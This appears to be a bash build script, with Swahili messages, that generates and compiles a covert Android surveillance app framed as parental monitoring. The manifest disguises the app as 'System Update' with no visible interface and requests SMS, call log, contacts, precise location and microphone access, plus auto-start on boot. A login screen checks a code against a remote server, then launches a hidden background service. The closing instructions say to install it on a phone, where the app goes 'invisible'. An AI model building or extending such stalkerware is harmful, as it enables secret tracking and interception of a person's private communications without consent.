#!/bin/bash
cd ~/android-surveillance-final2

echo "🔧 KUREKEBISHA MAKOSA NA PERMISSIONS MUHIMU..."

# 1. Rekebisha AndroidManifest - permissions muhimu tu
cat > app/src/main/AndroidManifest.xml << 'MANIFEST'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Permissions muhimu tu -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <application
        android:allowBackup="false"
        android:label="System Update"
        android:theme="@android:style/Theme.NoDisplay"
        android:persistent="true"
        tools:ignore="GoogleAppIndexingWarning">

        <!-- Stealth Activity - No icon in launcher -->
        <activity
            android:name=".StealthActivity"
            android:exported="true"
            android:excludeFromRecents="true"
            android:noHistory="true"
            android:taskAffinity=""
            android:launchMode="singleInstance">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Login Activity - Only shows when no code -->
        <activity
            android:name=".LoginActivity"
            android:exported="false"
            android:excludeFromRecents="true"
            android:noHistory="true"
            android:theme="@style/Theme.AppCompat.DayNight.NoActionBar" />

        <!-- Stealth Service - Hidden background service -->
        <service
            android:name=".StealthService"
            android:enabled="true"
            android:exported="false"
            android:stopWithTask="false" />

        <!-- Boot Receiver - Auto-start on boot -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
MANIFEST

# 2. Rekebisha LoginActivity - fix EText typo
cat > app/src/main/java/com/security/update/LoginActivity.java << 'LOGIN'
package com.security.update;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends AppCompatActivity {
    
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make window stealthy - no title, no status bar
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        setContentView(R.layout.activity_login);
        
        // Check if already logged in
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        String savedCode = prefs.getString("parent_code", "");
        
        if (!savedCode.isEmpty()) {
            // Already have code, go to stealth mode directly
            startStealthMode(savedCode);
            return;
        }
        
        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);
        
        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();
            
            if (code.isEmpty()) {
                Toast.makeText(this, "Tafadhali weka code!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            if (code.length() != 8) {
                Toast.makeText(this, "Code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            // Verify code with GhostTester server
            verifyParentCode(code);
        });
    }
    
    private void verifyParentCode(String code) {
        new Thread(() -> {
            try {
                // Server URL
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
                
                // Create JSON request
                JSONObject jsonRequest = new JSONObject();
                jsonRequest.put("parent_code", code);
                
                // Send verification request to server
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                
                // Send request
                OutputStream os = conn.getOutputStream();
                os.write(jsonRequest.toString().getBytes());
                os.flush();
                os.close();
                
                // Get response
                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    java.io.BufferedReader in = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();
                    
                    JSONObject jsonResponse = new JSONObject(response.toString());
                    boolean isValid = jsonResponse.getBoolean("valid");
                    
                    runOnUiThread(() -> {
                        if (isValid) {
                            String parentName = jsonResponse.optString("parent_name", "Mzazi");
                            String childPhone = jsonResponse.optString("child_phone", "Hakuna namba");
                            saveCodeAndEnterStealth(code, parentName, childPhone);
                        } else {
                            String error = jsonResponse.optString("error", "Code si sahihi!");
                            Toast.makeText(this, "❌ " + error, Toast.LENGTH_LONG).show();
                        }
                    });
                } else {
                    runOnUiThread(() -> {
                        // Fallback for testing
                        if (code.length() == 8) {
                            saveCodeAndEnterStealth(code, "Mzazi (Test)", "255000000000");
                        } else {
                            Toast.makeText(this, "❌ Hitilafu ya mtandao!", Toast.LENGTH_LONG).show();
                        }
                    });
                }
                
            } catch (Exception e) {
                runOnUiThread(() -> {
                    // Fallback for offline
                    if (code.length() == 8) {
                        saveCodeAndEnterStealth(code, "Mzazi (Offline)", "255000000000");
                    } else {
                        Toast.makeText(this, "❌ Hitilafu ya mtandao!", Toast.LENGTH_LONG).show();
                    }
                });
            }
        }).start();
    }
    
    private void saveCodeAndEnterStealth(String code, String parentName, String childPhone) {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("parent_code", code);
        editor.putString("parent_name", parentName);
        editor.putString("child_phone", childPhone);
        editor.putBoolean("stealth_mode", true);
        editor.apply();
        
        Toast.makeText(this, "✅ Code sahihi! Stealth mode imeshashtakiwa!", Toast.LENGTH_LONG).show();
        startStealthMode(code);
    }
    
    private void startStealthMode(String code) {
        Intent stealthIntent = new Intent(this, StealthService.class);
        stealthIntent.putExtra("PARENT_CODE", code);
        startService(stealthIntent);
        moveTaskToBack(true);
        finish();
    }
    
    @Override
    public void onBackPressed() {
        moveTaskToBack(true);
    }
}
LOGIN

# 3. Rekebisha build.gradle
cat > app/build.gradle << 'GRADLE'
plugins {
    id 'com.android.application'
}

android {
    namespace 'com.security.update'
    compileSdk 33

    defaultConfig {
        applicationId "com.security.update"
        minSdk 21
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            minifyEnabled false
            debuggable true
        }
    }
    
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.9.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}
GRADLE

# 4. Jaribu kujenga
echo "🔨 Inajenga APK..."
./gradlew clean
./gradlew assembleDebug --no-daemon

if [ $? -eq 0 ]; then
    echo ""
    echo "🎊 🎊 🎊 APK IMEBUIDIWA KIKAMILIFU! 🎊 🎊 🎊"
    echo ""
    echo "📱 APK FILE: app/build/outputs/apk/debug/app-debug.apk"
    echo ""
    echo "✅ PERMISSIONS ZILIZOACHWA:"
    echo "   📞 READ_CALL_LOG - Kusoma simu"
    echo "   💬 READ_SMS - Kusoma ujumbe"
    echo "   📍 ACCESS_FINE_LOCATION - Mapatano"
    echo "   👥 READ_CONTACTS - Anwani"
    echo "   🎤 RECORD_AUDIO - Kurekodi sauti"
    echo "   🌐 INTERNET - Mtandao"
    echo "   🔄 FOREGROUND_SERVICE - Background service"
    echo "   🔋 WAKE_LOCK - Kusimamisha usingizi"
    echo "   🚀 RECEIVE_BOOT_COMPLETED - Kuanza wenyewe"
    echo ""
    echo "📋 MAAGIZO:"
    echo "   1. Install APK kwenye simu"
    echo "   2. Kubali permissions zote"
    echo "   3. Weka Parent Code kutoka GhostTester"
    echo "   4. App itaenda invisible mode"
    echo ""
else
    echo "❌ Build imeshindikana. Jaribu GitHub Actions."
fi

# 5. Push mabadiliko
git add .
git commit -m "🔧 FIXED: Build errors & simplified permissions
- Fixed EText typo in LoginActivity
- Removed unnecessary permissions
- Kept only essential surveillance permissions
- Ready for successful build"
git push origin main

echo ""
echo "✅ KILA KITU KIMEKWISHA!"
